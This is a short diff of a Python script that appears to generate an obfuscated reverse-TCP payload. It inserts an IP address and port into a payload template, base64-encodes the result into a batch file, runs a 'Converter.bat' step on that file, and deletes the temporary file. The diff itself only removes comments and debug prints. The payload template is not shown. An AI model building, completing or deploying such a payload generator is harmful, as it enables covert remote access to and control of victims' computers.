@@ -23,25 +23,10 @@ def encrypt_string(text):
     return base64_encoded
 
 path = script_path = os.path.dirname(os.path.abspath(__file__))
-# print(path)
 
 r = open(f"{path}\\tcp_program.bat", "w")
 r.write(f"{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
 r.close()
 
-# batch_script = "Converter.bat"
-# batch_argument = "tcp_program.bat"
-
-# batch_script_path = os.path.abspath(batch_script)
-# batch_argument_path = os.path.abspath(batch_argument)
-
-# print(batch_script_path)
-# print(batch_argument_path)
-
-print(f'{path}\\Converter.bat {path}\\tcp_program.bat')
-
 os.system(f'{path}\\Converter.bat {path}\\tcp_program.bat')
-
 os.remove(f"{path}\\tcp_program.bat")
-
-# print(f"{colorama.Fore.LIGHTBLUE_EX}{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
